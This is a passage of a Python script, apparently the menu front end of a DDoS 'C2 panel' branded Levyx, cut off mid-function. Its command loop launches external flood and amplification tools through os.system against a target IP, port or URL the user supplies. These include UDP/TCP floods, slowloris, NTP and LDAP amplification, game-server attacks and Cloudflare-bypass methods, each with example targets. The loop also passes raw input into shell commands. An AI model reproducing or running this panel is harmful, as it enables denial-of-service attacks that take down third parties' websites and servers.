\u001B[35m                          ▐█▌▐▌▐█▄▄▌ ███  ▐█▀·.▪▐█·█▌
\u001B[35m                          .▀▀▀  ▀▀▀ . ▀    ▀ • •▀▀ ▀▀
                            🚀 𝙻𝚎𝚟𝚢𝚡 𝙲2 𝙿𝚘𝚠𝚎𝚛𝚙𝚛𝚘𝚘𝚏𝚝 🚀
\x1b[38;2;0;255;255m                     • \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m•  \x1b[38;2;0;255;255m     • \x1b[38;2;0;255;255m•\x1b[38;2;0;255;255m • \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m•     \x1b[38;2;0;255;255m  • \x1b[38;2;0;255;255m•\x1b[38;2;0;255;255m •\x1b[38;2;0;255;255m •
\x1b[38;2;0;255;255m                   ╚═══╦═════════════════════════════════╦═══╝
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║\x1b[38;2;0;255;255m AMP's \x1b[38;2;0;212;14m/ \x1b[38;2;0;255;255mGames \x1b[38;2;0;212;14m║
               \u001B[31m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-amp             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-amp           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mminecraft           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mstd               \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255msamp                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mldap              \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
               \u001B[31m╚═══════════════════════╩═════════════════════╝
                ▀▄▀▄▀▄𝙻𝙴𝚅𝚈𝚇 𝙲2 𝙳𝙳𝙾𝚂 𝙿𝙰𝙽𝙴𝙻 𝙾𝚆𝙽𝙴𝚁 𝙻𝙴𝚅𝚈𝚇𝙽𝙴𝚃▄▀▄▀▄▀
"''')


def menu():
    sys.stdout.write(f"\x1b]2;Levyx C2 --> Stars: [{bots}] | Online Users: [1] |Expired [72766627282] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
    clear()
    print('\u001B[31m[\u001B[35mLe\u001B[31mvyx\x1b[38;2;0;255;255m]|\u001B[38mW\u001B[35melc\u001B[31mome \u001B[35mto\u001B[31m Levyx \u001B[35mC2!\u001B[31m| \u001B[31mOwner: Levyx \u001B[35m|')
    print("")
    print("""
\x1b[38;2;0;255m⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;2;0;255m⠀⠀⠀⠀⠀⢾⠱\u001B[35m⢕⠠⢀⡀⠀⠀⠀⠀⠀⠀
\x1b[38;2;0;255m⠀⠀⠀⠀⠀⠈⢆⢸\u001B[35m⢣⠁⠛⡄⠀⠀⠀⠀⠀
\x1b[38;2;0;255m⠀⠀⠀⠀⠀⢠⢏⠨\u001B[35m⢪⢫⣷⡻⢆⠀⠀⠀ ⠀\u001B[31mSupported By:\x1b[38;2;0;255m [Levyx] 
\x1b[38;2;0;255m⠀⠀⠀⠀⣰⣯⢖⠆\u001B[35m⠁⠀⣸⡈⠉⠀⠀ ⠀⠀\u001B[31mVip: \x1b[38;2;0;255m[True] 
\x1b[38;2;0;255m⠀⠀⠀⠀⡾⣇⡔⡳⠀\u001B[35m⢠⢻⢳⣄⡀⠀⠀ ⠀\u001B[31mUser: \x1b[38;2;0;255m[Root] 
\x1b[38;2;0;255m⠀⠀⠀⠀⠀⣿⡇⣯⣶⢄\u001B[35m⠀⢢⡻⣦⡀⠀⠀
\x1b[38;2;0;255m⠀⠀⠀⠀⠀⠘⢿⠼⢸⣋\u001B[35m⠀⠀⡍⠻⣿⣦⠀
\x1b[38;2;0;255m⠀⠀⠀⠀⠀⠀⠆⡇⢸⡠\u001B[35m⣐⠥⡝⠶⠛⢿⠧
\x1b[38;2;0;255m⠀⠀⠀⠀⢀⣠⣼⣧⣼⣷⣁\u001B[35m⣒⣡⡴⠀⢸⡆
\x1b[38;2;0;255m⠀⠀⠀⣪⠿⠗⠂⠀⠔⠊⠉\u001B[35m⠉⠉⠉⢉⢢⠇           
\x1b[38;2;0;255m⠀⣠⠮⡷⠶⠿⠿⠭⠤⠤⣕\u001B[35m⣲⣶⣶⠾⠋⠀
\x1b[38;2;0;255m⠊⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""")



def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;0;255m╔══[Levyx\x1b[38;2;0;255m@Root\x1b[38;2;0;255m\x1b[38;2;0;255m\x1b[38;2;0;255m]
\x1b[38;2;0;255m╚\x1b[38;2;0;255m═\x1b[38;2;0;255m═\x1b[38;2;0;255m═\x1b[38;2;0;255m═\x1b[38;2;0;255m➤ \x1b[38;2;239;239;239m''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "VipMethod" or cnc == "VipMethod" or cnc == "VipMethod" or cnc == "VipMethod":
            VipMethod()    
        elif cnc == "help" or cnc == "help" or cnc == "L4" or cnc == "l4":
            help()     
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            amp_games()
        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
            special()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
            banners()

# LAYER 4 METHODS   

        elif "udpbypass" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python UDP-BYPASS {ip} {port}')
            except IndexError:
                print('Usage: udpbypass <ip> <port>')
                print('Example: udpbypass 1.1.1.1 80')

        elif "stdv2" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python std {ip} {port}')
            except IndexError:
                print('Usage: stdv2 <ip> <port>')
                print('Example: stdv2 1.1.1.1 80')

        elif "flux" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'python flux {ip} {port} {thread} 0')
            except IndexError:
                print('Usage: flux <ip> <port> <threads>')
                print('Example: flux 1.1.1.1 80 250')

        elif "slowloris" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python slowloris {ip} {port}')
            except IndexError:
                print('Usage: slowloris <ip> <port>')
                print('Example: slowloris 1.1.1.1 80')

        elif "god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl god.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: god <ip> <port> <time>')
                print('Example: god 1.1.1.1 80 60')

        elif "destroy" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: destroy <ip> <port> <time>')
                print('Example: destroy 1.1.1.1 80 60')

        elif "std" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python STD-NOSPOOF {ip} {port}')
            except IndexError:
                print('Usage: std <ip> <port>')
                print('Example: std 1.1.1.1 80')

        elif "home" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print('Usage: home <ip> <port> <packet_size> <time>')
                print('Example: home 1.1.1.1 80 65500 60')

        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 udp.py {ip} {port} 0 0')
            except IndexError:
                print('Usage: udp <ip> <port>')
                print('Example: udp 1.1.1.1 80')

        elif "nfo-killer" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'python nfo-killer {ip} {port} {threads} -1 {time}')
            except IndexError:
                print('Usage: nfo-killer <ip> <port> <threads> <time>')
                print('Example: nfo-killer 1.1.1.1 80 850 60')

        elif "ovh-raw" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'python ovh-raw {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')

        elif "tcp" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'python 100UP-TCP {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: tcp GET 1.1.1.1 80 60 8500')

# SPECIAL METHODS

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('      [3] HTTP')
                print('Example: stress 1.1.1.1 80 3 1250 60 5')
                
# AMP/GAMES METHODS

        elif "samp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 samp.py {ip} {port}')
            except IndexError:
                print('Usage: samp <ip> <port>')
                print('Example: samp 1.1.1.1 7777')

        elif "ldap" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'python ldap {ip} {port} {thread} -1 {time}')
            except IndexError:
                print('Usage: ldap <ip> <port> <threads> <time>')
                print('Example: ldap 1.1.1.1 80 650 60')

        elif "minecraft" in cnc:
            try:
                ip = cnc.split()[1]
                throttle = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'python MINECRAFT-SLAM {ip} {threads} {time}')
            except IndexError:
                print('Usage: minecraft <ip> <throttle> <threads> <time>')
                print('Example: minecraft 1.1.1.1 5000 500 60')

        elif "ovh-amp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python OVH-AMP {ip} {port}')
            except IndexError:
                print('Usage: ovh-amp <ip> <port>')
                print('Example: ovh-amp 1.1.1.1 80')
                
        elif "ntp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                throttle = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'python ntp {ip} {port} ntp.txt {throttle} {time}')
            except IndexError:
                print('Usage: ntp <ip> <port> <throttle> <time>')
                print('Example: ntp 1.1.1.1 22 250 60')

# LAYER 7 METHODS
        elif "http-fuzz" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node httpfuzz.js {url} proxies.txt {time} POST')
            except IndexError:
                print(f'Usage: http-fuzz <url> <time>')
                print("Example: http-fuzz http://sexo.org 30")
 
        elif "ovh-beam" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4] 
                os.system(f'python OVH-BEAM {method} {ip} {port} {time} 1024')
            except IndexError:
                print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                print('Example: ovh-beam GET 51.38.92.223 80 60')
    
        elif "https-spoof" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'python3 https-spoof.py {url} {time} {thread}')
            except IndexError:
                print('Usage: https-spoof <url> <time> <threads>')
                print('Example: https-spoof http://vailon.com 60 500')
    
        elif "slow" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node slow.js {url} {time}')
            except IndexError:
                print('Usage: slow <url> <time>')
                print('Example: slow http://vailon.com 60')
    
        elif "hyper" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node hyper.js {url} {time}')
            except IndexError:
                print('Usage: hyper <url> <time>')
                print('Example: hyper http://vailon.com 60')
                
        elif "cf-socket" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'python3 bypass.py {url} {time}')
            except IndexError:
                print('Usage: cf-socket <url> <thread> <time>')
                print('Example: cf-socket http://vailon.com 5000 60')
    
        elif "cf-pro" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'python3 cf-pro.py {url} {time}')
            except IndexError:
                print('Usage: cf-pro <url> <thread> <time>')
                print('Example: cf-pro http://vailon.com 5000 60')
        
        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print('Usage: http-socket <url> <per> <time>')
                print('Example: http-socket http://example.com 5000 60')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print('Usage: http-raw <url> <time>')
                print('Example: http-raw http://example.com 60')

        elif "http-requests" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'python3 HTTP-REQUESTS {url} {time}')
            except IndexError:
                print('Usage: http-requests <url> <time>')
                print('Example: http-requests http://example.org 60')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('Usage: http-rand <url> <time>')
                print('Example: http-rand http://vailon.com/ 60')

        elif "overflow" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'python OVERFLOW {ip} {port} {thread}')
            except IndexError:
                print('Usage: overflow <ip> <port> <threads>')
                print('Example: overflow 1.1.1.1 80 5000')

        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example.com 60 1250')

        elif "uambypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                per = cnc.split()[3]
                os.system(f'node uambypass.js {url} {time} {per} http.txt')
            except IndexError:
                print('Usage: uambypass <url> <time> <req_per_ip>')
                print('Example: uambypass http://example.com 60 1250')

        elif "crash" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('Usage: crash <url> METHODS<GET/POST>')
                print('Example: crash http://example.com GET')

        elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')

        elif "httpget" in cnc:
            try:
                url = cnc.split()[1]
                os.system(f'python httpget {url} 10000 50 100')
            except IndexError:
                print('Usage: httpget <url>')
                print('Example: httpget http://example.com')

# BANNERS

        elif "troll" in cnc:
                print('░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░   ')
                print('░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░  ')
                print('░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░  ')
                print('░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░  ')
                print('░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░  ')
                print('█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█  ')
                print('█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█  ')
                print('░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░  ')
                print('░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░  ')
                print('░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░  ')
                print('░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░  ')
                print('░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░  ')
                print('░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░  ')
                print('░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░  ')
                print('░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░  ')

        elif "pikachu" in cnc:
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⠀⠹⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠿⠃⠀⠀⠐⠚⠻⢷⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢁⣀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⢠⣾⠟⠁⠀⠀⠙⢿⣦⣄⠀⠀⠀⠀⣼⠏⣼⣧⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⣴⡿⠃⠀⠀⠀⠀⠀⠀⠉⠻⣷⣤⣤⡾⢿⠐⣿⡿⠃⠀⠀⠀⢀⡖⠒⣦⡀⠀⠀⠀⠀⠈⠙⠛⠷⣦⣄⡀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡿⠁⢸⠀⠀⣤⡄⠀⠀⠀⢸⣧⣤⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣄⠀⠀⠀  ')
                print('⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⡠⠃⠀⣀⡈⠀⠀⠀⠀⠘⢿⣿⣿⠟⠀⠀⠀⠀⠠⣄⠀⠀⠀⠀⠀⠈⢻⣷⣄⠀  ')
                print('⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢹⡟⠓⣶⠀⠀⠀⠀⣨⣤⣤⡀⠀⠀⠀⠀⢸⣿⣶⣦⣤⣶⣾⣿⣿⣿⣆  ')
                print('⢠⣿⣷⣶⣶⣶⣶⣤⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠘⣧⠀⠀⠈⣄⠀⡏⠀⠀⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⣸⡟⠀⠉⠙⠛⠛⠿⠿⠿⠛  ')
                print('⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⣹⣿⠟⠋⠀⠀⣠⣴⡿⠿⣷⣄⠀⠈⠓⠁⠀⠀⠀⠈⠿⣿⡿⠏⠀⠀⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡟⠁⠀⠀⠀⢾⣿⣯⡀⠀⢸⡏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠒⠛⠛⠿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⢿⣶⣦⣤⣀⠈⠙⢿⣶⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⡿⠃⣠⣿⢋⣽⣷⠀⠀⠀⠀⠉⠳⢦⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣷⣶⣿⣧⣾⣿⣿⡆⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠈⠻⢦⣤⣤⣴⡟⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⠋⠉⠛⠃⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣧⡀⠀⠀⠀⠈⠳⣤⡀⠀⠀⠀⢀⡗⠀⠀⠀⠀⠀⠀⠀⠈⣿⡆⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣿⣿⣿⣷⡄⠀⠀⠀⠀⠈⠙⠓⠶⠶⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠛⠋⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣇⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⡀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣤⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⣀⣠⣤⣾⠁⠀⠀⠀⣸⣿⡀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣉⣀⣀⣀⣤⣾⣿⣷⣶⣶⣶⣿⡿⠿⠿⠛⠛⠿⣷⣤⣄⡈⠀⠉⣿⡆⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠁⠀⠀⠀⠀  ')

                
# TOOLS
        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')                

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')
           
def VipMethod():
    clear()
    si()
    print(f'''
    
    

\x1b[38;2;0;255;255m                                ██╗   ██╗██╗██████╗
\x1b[38;2;0;255;255m                                ██║   ██║██║██╔══██╗
\x1b[38;2;0;255;255m                                ██║   ██║██║██████╔╝
\x1b[38;2;0;255;255m                                ╚██╗ ██╔╝██║██╔═══╝
\x1b[38;2;0;255;255m                                 ╚████╔╝ ██║██║
\x1b[38;2;0;255;255m                                  ╚═══╝  ╚═╝╚═╝
                            🚀 𝙻𝚎𝚟𝚢𝚡 𝙲2 𝙿𝚘𝚠𝚎𝚛𝚙𝚛𝚘𝚘𝚏𝚝 🚀
\x1b[38;2;0;255;255m                     • \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m•  \x1b[38;2;0;255;255m     • \x1b[38;2;0;255;255m•\x1b[38;2;0;255;255m • \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m•     \x1b[38;2;0;255;255m  • \x1b[38;2;0;255;255m•\x1b[38;2;0;255;255m •\x1b[38;2;0;255;255m •                            
\x1b[38;2;0;255;255m╔═══                                                                           ═══╗

